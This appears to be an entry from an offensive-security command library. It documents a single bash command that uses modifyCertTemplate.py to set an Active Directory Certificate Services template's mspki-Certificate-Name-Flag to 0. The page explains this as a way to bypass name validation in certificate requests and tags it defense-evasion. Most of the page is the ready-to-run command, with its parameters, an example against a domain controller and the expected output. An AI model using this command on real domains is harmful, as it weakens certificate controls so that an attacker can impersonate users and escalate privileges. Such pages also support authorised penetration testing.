---
type: command
executor: bash
data: >-
  python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template
  $_TEMPLATE_NAME -dc-ip $_DC_IP -value 0 -property mspki-Certificate-Name-Flag
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - ad-cs
  - defense-evasion
verified: true
validated: true
---

# set-certificate-name-flag-to-zero

## Command

```bash
python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template $_TEMPLATE_NAME -dc-ip $_DC_IP -value 0 -property mspki-Certificate-Name-Flag
```

## Description

Sets the mspki-Certificate-Name-Flag property to 0, enforcing UPN-based subject construction and enabling bypass of name validation in certificate requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name | Yes |
| $_USERNAME | User for auth | Yes |
| -k | Kerberos | Yes |
| -no-pass | No pass | Yes |
| -template $_TEMPLATE_NAME | Template (e.g., User) | Yes |
| -dc-ip $_DC_IP | DC IP | Yes |
| -value 0 | Set flag to 0 | Yes |
| -property mspki-Certificate-Name-Flag | Property name | Yes |

## Examples

### Basic Usage

```bash
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template User -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
```

## Expected Output

```
Property updated: mspki-Certificate-Name-Flag = 0
```

## Related

- [[procedures/Active-Directory-Certificate-Services-Access-Control-Vulnerabilities]]
